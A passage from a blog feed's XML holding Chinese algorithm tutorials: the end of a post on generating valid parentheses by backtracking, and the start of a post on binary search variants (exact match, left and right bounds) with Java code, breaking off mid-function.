中左括号的数量都大于或等于右括号的数量</strong>。</p><p>如果不跟你说这个性质，可能不太容易发现，但是稍微想一下，其实很容易理解，因为从左往右算的话，肯定是左括号多嘛，到最后左右括号数量相等，说明这个括号组合是合法的。</p><p>反之，比如这个括号组合 <code>))((</code>，前几个子串都是右括号多于左括号，显然不是合法的括号组合。</p><p>下面就来手把手实践一下回溯算法框架。</p><p><strong>回溯思路</strong></p><p>明白了合法括号的性质，如何把这道题和回溯算法扯上关系呢？</p><p>算法输入一个整数 <code>n</code>，让你计算 <strong><code>n</code> 对括号</strong>能组成几种合法的括号组合，可以改写成如下问题：</p><p><strong>现在有 <code>2n</code> 个位置，每个位置可以放置字符 <code>(</code> 或者 <code>)</code>，组成的所有括号组合中，有多少个是合法的</strong>？</p><p>这个命题和题目的意思完全是一样的对吧，那么我们先想想如何得到全部 <code>2^(2n)</code> 种组合，然后再根据我们刚才总结出的合法括号组合的性质筛选出合法的组合，不就完事儿了？</p><p>如何得到所有的组合呢？这就是标准的暴力穷举回溯框架啊，我们前文 <a href="https://labuladong.gitee.io/algo/算法思维系列/回溯算法详解修订版.html">回溯算法套路框架详解</a> 都总结过了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">LinkedList&lt;Integer&gt; result = <span class="hljs-keyword">new</span> List&lt;&gt;();<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(路径, 选择列表)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> 满足结束条件&#123;<br>        result.add(路径)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(选择：选择列表)&#123;<br>        做选择<br>        backtrack(路径, 选择列表)<br>        撤销选择<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><p>那么对于我们的需求，如何打印所有括号组合呢？套一下框架就出来了，伪码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> i, String track)</span> </span>&#123;<br>    <span class="hljs-comment">// i 代表当前的位置，共 2n 个位置</span><br>    <span class="hljs-comment">// 穷举到最后一个位置了，得到一个长度为 2n 组合</span><br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span> * n) &#123;<br>        print(track);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 对于每个位置可以是左括号或者右括号两种选择</span><br>    <span class="hljs-keyword">for</span> choice in [<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>] &#123;<br>        track.push(choice); <span class="hljs-comment">// 做选择</span><br>        <span class="hljs-comment">// 穷举下一个位置</span><br>        backtrack(n, i + <span class="hljs-number">1</span>, track);<br>        track.pop(choice); <span class="hljs-comment">// 撤销选择</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么，现在能够打印所有括号组合了，如何从它们中筛选出合法的括号组合呢？很简单，加几个条件进行「剪枝」就行了。</p><p>对于 <code>2n</code> 个位置，必然有 <code>n</code> 个左括号，<code>n</code> 个右括号，所以我们不是简单的记录穷举位置 <code>i</code>，而是<strong>用 <code>left</code> 记录还可以使用多少个左括号，用 <code>right</code> 记录还可以使用多少个右括号</strong>，这样就可以通过刚才总结的合法括号规律进行筛选了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-comment">//结果数组</span><br>    LinkedList&lt;String&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    <span class="hljs-comment">//回溯路径</span><br>    StringBuilder track = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-comment">// 可用的左括号和右括号数量初始化为 n</span><br>    backtrack(n, n, track, res);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right, StringBuilder track, LinkedList&lt;String&gt; res)</span></span>&#123;<br>    <span class="hljs-comment">//剩下可用左括号多，不合法</span><br>    <span class="hljs-keyword">if</span>(left &gt; right)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//剩余可用&lt;0,不合法</span><br>    <span class="hljs-keyword">if</span>(left &lt; <span class="hljs-number">0</span> || right &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//剩余括号正好为0合法</span><br>    <span class="hljs-keyword">if</span>(left == <span class="hljs-number">0</span> &amp;&amp; right == <span class="hljs-number">0</span>)&#123;<br>        String s = track.toString();<br>        res.add(s);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//放左括号</span><br>    track.append(<span class="hljs-string">&#x27;(&#x27;</span>);<br>    backtrack(left - <span class="hljs-number">1</span>, right, track, res);<br>    track.deleteCharAt(track.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//放右括号</span><br>    track.append(<span class="hljs-string">&#x27;)&#x27;</span>);<br>    backtrack(left, right - <span class="hljs-number">1</span>, track, res);<br>    track.deleteCharAt(track.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，我们的算法就完成了，算法的复杂度是多少呢？这个比较难分析，<strong>对于递归相关的算法，时间复杂度这样计算（递归次数）*（递归函数本身的时间复杂度）</strong>。</p><p><code>backtrack</code> 就是我们的递归函数，其中没有任何 for 循环代码，所以递归函数本身的时间复杂度是 O(1)，但关键是这个函数的递归次数是多少？换句话说，给定一个 <code>n</code>，<code>backtrack</code> 函数递归被调用了多少次？</p><p>我们前面怎么分析动态规划算法的递归次数的？主要是看「状态」的个数对吧。其实回溯算法和动态规划的本质都是穷举，只不过动态规划存在「重叠子问题」可以优化，而回溯算法不存在而已。</p><p>所以说这里也可以用「状态」这个概念，<strong>对于 <code>backtrack</code> 函数，状态有三个，分别是 <code>left, right, track</code></strong>，这三个变量的所有组合个数就是 <code>backtrack</code> 函数的状态个数（调用次数）。</p><p><code>left</code> 和 <code>right</code> 的组合好办，他俩取值就是 0~n 嘛，组合起来也就 <code>n^2</code> 种而已；这个 <code>track</code> 的长度虽然取在 0~2n，但对于每一个长度，它还有指数级的括号组合，这个是不好算的，是 $\frac{4^{n}}{\sqrt{n}}$。</p>]]></content>
    
    
    <summary type="html">回溯算法是一个决策树的遍历过程。</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="回溯" scheme="http://example.com/tags/%E5%9B%9E%E6%BA%AF/"/>
    
  </entry>
  
  <entry>
    <title>数组</title>
    <link href="http://example.com/2021/03/06/%E6%95%B0%E7%BB%84/"/>
    <id>http://example.com/2021/03/06/%E6%95%B0%E7%BB%84/</id>
    <published>2021-03-06T05:26:42.000Z</published>
    <updated>2021-03-13T10:27:06.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-二分查找"><a href="#1-二分查找" class="headerlink" title="1. 二分查找"></a>1. 二分查找</h1><h2 id="1-1-二分查找详解"><a href="#1-1-二分查找详解" class="headerlink" title="1.1 二分查找详解"></a>1.1 二分查找详解</h2><p>本文探究几个最常用的二分查找场景：寻找一个数、寻找左侧边界、寻找右侧边界。而且，我们就是要深入细节，比如不等号是否应该带等号，mid 是否应该加一等等。分析这些细节的差异以及出现这些差异的原因，保证你能灵活准确地写出正确的二分查找算法。</p><h3 id="1-1-1-二分查找框架"><a href="#1-1-1-二分查找框架" class="headerlink" title="1.1.1 二分查找框架"></a>1.1.1 二分查找框架</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">binarySearch</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = ...;<br><br>    <span class="hljs-keyword">while</span>(...) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            ...<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = ...<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = ...<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ...;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析二分查找的一个技巧是：不要出现 else，而是把所有情况用 else if 写清楚，这样可以清楚地展现所有细节</strong>。本文都会使用 else if，旨在讲清楚，读者理解后可自行简化。</p><p>其中 <code>...</code> 标记的部分，就是可能出现细节问题的地方，当你见到一个二分查找的代码时，首先注意这几个地方。后文用实例分析这些地方能有什么样的变化。</p><p>另外声明一下，计算 mid 时需要防止溢出，代码中 <code>left + (right - left) / 2</code> 就和 <code>(left + right) / 2</code> 的结果相同，但是有效防止了 <code>left</code> 和 <code>right</code> 太大直接相加导致溢出。</p><h3 id="1-1-2-寻找一个数（基本的二分搜索）"><a href="#1-1-2-寻找一个数（基本的二分搜索）" class="headerlink" title="1.1.2 寻找一个数（基本的二分搜索）"></a>1.1.2 寻找一个数（基本的二分搜索）</h3><p>这个场景是最简单的，可能也是大家最熟悉的，即搜索一个数，如果存在，返回其索引，否则返回 -1。    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">binarySearch</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意</span><br><br>    <span class="hljs-keyword">while</span>(left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(nums[mid] == target)<br>            <span class="hljs-keyword">return</span> mid; <br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target)<br>            left = mid + <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target)<br>            right = mid - <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1、为什么 while 循环的条件中是 &lt;=，而不是 &lt;</strong>？</p><p>答：因为初始化 <code>right</code> 的赋值是 <code>nums.length - 1</code>，即最后一个元素的索引，而不是 <code>nums.length</code>。</p><p>这二者可能出现在不同功能的二分查找中，区别是：前者相当于两端都闭区间 <code>[left, right]</code>，后者相当于左闭右开区间 <code>[left, right)</code>，因为索引大小为 <code>nums.length</code> 是越界的。</p><p>我们这个算法中使用的是前者 <code>[left, right]</code> 两端都闭的区间。<strong>这个区间其实就是每次进行搜索的区间</strong>。</p><p>什么时候应该停止搜索呢？当然，找到了目标值的时候可以终止：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(nums[mid] == target)<br>    <span class="hljs-keyword">return</span> mid;<br></code></pre></td></tr></table></figure><p>但如果没找到，就需要 while 循环终止，然后返回 -1。那 while 循环什么时候应该终止？<strong>搜索区间为空的时候应该终止</strong>，意味着你没得找了，就等于没找到嘛。</p><p><code>while(left &lt;= right)</code> 的终止条件是 <code>left == right + 1</code>，写成区间的形式就是 <code>[right + 1, right]</code>，或者带个具体的数字进去 <code>[3, 2]</code>，可见<strong>这时候区间为空</strong>，因为没有数字既大于等于 3 又小于等于 2 的吧。所以这时候 while 循环终止是正确的，直接返回 -1 即可。</p><p><code>while(left &lt; right)</code> 的终止条件是 <code>left == right</code>，写成区间的形式就是 <code>[right, right]</code>，或者带个具体的数字进去 <code>[2, 2]</code>，<strong>这时候区间非空</strong>，还有一个数 2，但此时 while 循环终止了。也就是说这区间 <code>[2, 2]</code> 被漏掉了，索引 2 没有被搜索，如果这时候直接返回 -1 就是错误的。</p><p>当然，如果你非要用 <code>while(left &lt; right)</code> 也可以，我们已经知道了出错的原因，就打个补丁好了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br><span class="hljs-keyword">while</span>(left &lt; right) &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-keyword">return</span> nums[left] == target ? left : -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><strong>2、为什么</strong> <strong><code>left = mid + 1</code></strong>，<strong><code>right = mid - 1</code></strong>？我看有的代码是 <strong><code>right = mid</code></strong>或者 <strong><code>left = mid</code></strong>，没有这些加加减减，到底怎么回事，怎么判断？</p><p>答：这也是二分查找的一个难点，不过只要你能理解前面的内容，就能够很容易判断。</p><p>刚才明确了「搜索区间」这个概念，而且本算法的搜索区间是两端都闭的，即 <code>[left, right]</code>。那么当我们发现索引 <code>mid</code> 不是要找的 <code>target</code> 时，下一步应该去搜索哪里呢？</p><p>当然是去搜索 <code>[left, mid-1]</code> 或者 <code>[mid+1, right]</code> 对不对？<strong>因为</strong> <strong><code>mid</code></strong> <strong>已经搜索过，应该从搜索区间中去除</strong>。</p><p><strong>3、此算法有什么缺陷</strong>？</p><p>答：至此，你应该已经掌握了该算法的所有细节，以及这样处理的原因。但是，这个算法存在局限性。</p><p>比如说给你有序数组 <code>nums = [1,2,2,2,3]</code>，<code>target</code> 为 2，此算法返回的索引是 2，没错。但是如果我想得到 <code>target</code> 的左侧边界，即索引 1，或者我想得到 <code>target</code> 的右侧边界，即索引 3，这样的话此算法是无法处理的。</p><p>这样的需求很常见，<strong>你也许会说，找到一个 target，然后向左或向右线性搜索不行吗？可以，但是不好，因为这样难以保证二分查找对数级的复杂度了</strong>。</p><p>我们后续的算法就来讨论这两种二分查找的算法。</p><h3 id="1-1-3-寻找左侧边界的二分搜索"><a href="#1-1-3-寻找左侧边界的二分搜索" class="headerlink" title="1.1.3 寻找左侧边界的二分搜索"></a>1.1.3 寻找左侧边界的二分搜索</h3><p>以下是最常见的代码形式，其中的标记是需要注意的细节：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">left_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> right = nums.length; <span class="hljs-comment">// 注意</span><br><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123; <span class="hljs-comment">// 注意</span><br>        <span class="hljs-keyword">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            right = mid;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            right = mid; <span class="hljs-comment">// 注意</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1、为什么 while 中是</strong> <strong><code>&lt;</code></strong> <strong>而不是</strong> <strong><code>&lt;=</code></strong>?</p><p>答：用相同的方法分析，因为 <code>right = nums.length</code> 而不是 <code>nums.length - 1</code>。因此每次循环的「搜索区间」是 <code>[left, right)</code> 左闭右开。</p><p><code>while(left &lt; right)</code> 终止的条件是 <code>left == right</code>，此时搜索区间 <code>[left, left)</code> 为空，所以可以正确终止。</p><p>PS：这里先要说一个搜索左右边界和上面这个算法的一个区别，也是很多读者问的：<strong>刚才的</strong> <strong><code>right</code></strong> <strong>不是</strong> <strong><code>nums.length - 1</code></strong> <strong>吗，为啥这里非要写成</strong> <strong><code>nums.length</code></strong> <strong>使得「搜索区间」变成左闭右开呢</strong>？</p><p>因为对于搜索左右侧边界的二分查找，这种写法比较普遍，我就拿这种写法举例了，保证你以后遇到这类代码可以理解。你非要用两端都闭的写法反而更简单，我会在后面写相关的代码，把三种二分搜索都用一种两端都闭的写法统一起来，你耐心往后看就行了。</p><p><strong>2、为什么没有返回 -1 的操作？如果</strong> <strong><code>nums</code></strong> <strong>中不存在</strong> <strong><code>target</code></strong> <strong>这个值，怎么办</strong>？</p><p>答：因为要一步一步来，先理解一下这个「左侧边界」有什么特殊含义：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/二分左边界.jpg" alt="二分左边界" style="zoom: 50%;" /></p><p>对于这个数组，算法会返回 1。这个 1 的含义可以这样解读：<code>nums</code> 中小于 2 的元素有 1 个。</p><p>比如对于有序数组 <code>nums = [2,3,5,7]</code>, <code>target = 1</code>，算法会返回 0，含义是：<code>nums</code> 中小于 1 的元素有 0 个。</p><p>再比如说 <code>nums = [2,3,5,7], target = 8</code>，算法会返回 4，含义是：<code>nums</code> 中小于 8 的元素有 4 个。</p><p>综上可以看出，函数的返回值（即 <code>left</code> 变量的值）取值区间是闭区间 <code>[0, nums.length]</code>，所以我们简单添加两行代码就能在正确的时候 return -1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-comment">//...</span><br>&#125;<br><span class="hljs-comment">// target 比所有数都大</span><br><span class="hljs-keyword">if</span> (left == nums.length) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br><span class="hljs-comment">// 类似之前算法的处理方式</span><br><span class="hljs-keyword">return</span> nums[left] == target ? left : -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><strong>3、为什么</strong> <strong><code>left = mid + 1</code></strong>，<strong><code>right = mid</code></strong> <strong>？和之前的算法不一样</strong>？</p><p>答：这个很好解释，因为我们的「搜索区间」是 <code>[left, right)</code> 左闭右开，所以当 <code>nums[mid]</code> 被检测之后，下一步的搜索区间应该去掉 <code>mid</code> 分割成两个区间，即 <code>[left, mid)</code> 或 <code>[mid + 1, right)</code>。</p><p><strong>4、为什么该算法能够搜索左侧边界</strong>？</p><p>答：关键在于对于 <code>nums[mid] == target</code> 这种情况的处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (nums[mid] == target)<br>    right = mid;<br></code></pre></td></tr></table></figure><p>可见，找到 target 时不要立即返回，而是缩小「搜索区间」的上界 <code>right</code>，在区间 <code>[left, mid)</code> 中继续搜索，即不断向左收缩，达到锁定左侧边界的目的。</p><p><strong>5、为什么返回</strong> <strong><code>left</code></strong> <strong>而不是</strong> <strong><code>right</code></strong>？</p><p>答：都是一样的，因为 while 终止的条件是 <code>left == right</code>。</p><p><strong>6、能不能想办法把</strong> <strong><code>right</code></strong> <strong>变成</strong> <strong><code>nums.length - 1</code></strong>，也就是继续使用两边都闭的「搜索区间」？这样就可以和第一种二分搜索在某种程度上统一起来了**。</p><p>答：当然可以，只要你明白了「搜索区间」这个概念，就能有效避免漏掉元素，随便你怎么改都行。下面我们严格根据逻辑来修改：</p><p>因为你非要让搜索区间两端都闭，所以 <code>right</code> 应该初始化为 <code>nums.length - 1</code>，while 的终止条件应该是 <code>left == right + 1</code>，也就是其中应该用 <code>&lt;=</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">left_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-comment">// 搜索区间为 [left, right]</span><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-comment">// if else ...</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>因为搜索区间是两端都闭的，且现在是搜索左侧边界，所以 <code>left</code> 和 <code>right</code> 的更新逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>    <span class="hljs-comment">// 搜索区间变为 [mid+1, right]</span><br>    left = mid + <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>    <span class="hljs-comment">// 搜索区间变为 [left, mid-1]</span><br>    right = mid - <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>    <span class="hljs-comment">// 收缩右侧边界</span><br>    right = mid - <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于 while 的退出条件是 <code>left == right + 1</code>，所以当 <code>target</code> 比 <code>nums</code> 中所有元素都大时，会存在以下情况使得索引越界：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/左边界2.jpg" alt="img" style="zoom:50%;" /></p><p>因此，最后返回结果的代码应该检查越界情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (left &gt;= nums.length || nums[left] != target)<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> left;<br></code></pre></td></tr></table></figure><p>至此，整个算法就写完了，完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">left_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 搜索区间为 [left, right]</span><br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>            <span class="hljs-comment">// 搜索区间变为 [mid+1, right]</span><br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>            <span class="hljs-comment">// 搜索区间变为 [left, mid-1]</span><br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>            <span class="hljs-comment">// 收缩右侧边界</span><br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 检查出界情况</span><br>    <span class="hljs-keyword">if</span> (left &gt;= nums.length || nums[left] != target)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就和第一种二分搜索算法统一了，都是两端都闭的「搜索区间」，而且最后返回的也是 <code>left</code> 变量的值。只要把住二分搜索的逻辑，两种形式大家看自己喜欢哪种记哪种吧。</p><h3 id="1-1-4-寻找右侧边界的二分查找"><a href="#1-1-4-寻找右侧边界的二分查找" class="headerlink" title="1.1.4 寻找右侧边界的二分查找"></a>1.1.4 寻找右侧边界的二分查找</h3><p>类似寻找左侧边界的算法，这里也会提供两种写法，还是先写常见的左闭右开的写法，只有两处和搜索左侧边界不同，已标注：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">right_bound</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = nums.length;<br><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span 